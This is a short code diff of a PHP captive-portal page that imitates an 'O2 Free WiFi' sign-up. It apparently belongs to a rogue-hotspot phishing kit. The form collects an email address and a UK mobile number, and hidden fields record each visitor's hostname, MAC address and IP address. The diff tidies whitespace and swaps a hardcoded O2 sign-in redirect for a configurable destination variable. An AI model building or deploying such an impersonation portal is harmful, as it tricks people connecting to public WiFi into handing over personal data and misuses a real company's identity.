@@ -44,7 +44,7 @@ require_once('helper.php');
             <center>
 
             <h2>Sign up to access O<sub>2</sub> Free WiFi</h2>
-              
+
             <input type="text" name="email" placeholder="Email address" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
 
             <input type="number" name="mobile" placeholder="UK mobile number" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
@@ -56,7 +56,7 @@ require_once('helper.php');
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-            <input type="hidden" name="target" value="https://accounts.o2.co.uk/signin">
+            <input type="hidden" name="target" value="<?=$destination?>">
             <input type="submit" value="Sign up">
 
         </form>
